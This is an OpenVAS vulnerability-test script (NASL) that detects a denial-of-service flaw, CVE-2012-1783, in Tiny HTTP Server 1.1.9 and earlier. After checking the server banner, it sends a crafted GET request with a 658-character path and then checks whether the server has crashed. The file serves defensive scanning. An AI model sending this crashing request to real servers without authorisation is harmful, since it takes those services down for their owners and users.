###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tiny_http_server_remote_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# Tiny HTTP Server Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802614");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2012-1783");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-03-05 11:01:07 +0530 (Mon, 05 Mar 2012)");
  script_name("Tiny HTTP Server Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73482");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18524");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110220/Tiny-HTTP-Server-1.1.9-Crash.html");

  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TinyServer/banner");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");
  script_tag(name:"affected", value:"Tiny HTTP Server versions 1.1.9 and prior");
  script_tag(name:"insight", value:"The flaw is due to an error when processing certain requests
  and can be exploited to cause a denial of service via a specially crafted packet.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Tiny HTTP Server and is prone to denial of
  service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}


include("http_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if(!banner || "Server: TinyServer" >!< banner){
  exit(0);
}

req = http_get(item:string("/",crap(658)), port:port);

## Send crafted request
res = http_send_recv(port:port, data:req);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
